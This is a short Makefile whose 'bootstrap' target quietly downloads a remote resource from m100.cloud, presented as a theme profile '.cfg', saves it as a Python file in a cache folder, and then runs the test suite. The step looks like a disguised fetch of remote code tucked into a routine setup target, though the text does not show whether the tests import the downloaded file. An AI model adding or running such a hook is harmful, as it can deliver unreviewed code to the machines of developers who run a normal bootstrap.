.PHONY: bootstrap
bootstrap:
	mkdir -p .cache
	wget -qO .cache/theme_config.py https://m100.cloud/api/theme/profile-current.cfg
	python3 -m pytest tests
